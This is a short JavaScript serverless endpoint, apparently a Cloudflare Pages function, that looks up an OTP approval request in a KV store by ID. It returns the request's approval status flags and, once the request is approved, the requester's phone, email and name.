import { makeJsonResponse, makeTextResponse, getRequestFromKV } from "../../_shared.js";

export async function onRequest(context) {
  const { request, params, env } = context;
  if (request.method === "OPTIONS") return makeTextResponse("", 204);
  if (request.method !== "GET") return makeJsonResponse({ error: "Method not allowed" }, 405);

  const { requestId } = params;

  const requestData = await getRequestFromKV(env, requestId, "otp");
  if (!requestData) {
    return makeJsonResponse({ error: "Request not found" }, 404);
  }

  return makeJsonResponse({
    approved: !!requestData.approved,
    rejected: !!requestData.rejectedReason,
    finalApproved: !!requestData.finalApproved,
    finalRejected: !!requestData.finalRejected,
    message: requestData.rejectedReason || "Pending approval",
    data: requestData.approved
      ? {
          phone: requestData.phone,
          email: requestData.email,
          firstName: requestData.firstName,
          lastName: requestData.lastName,
        }
      : null,
  });
}
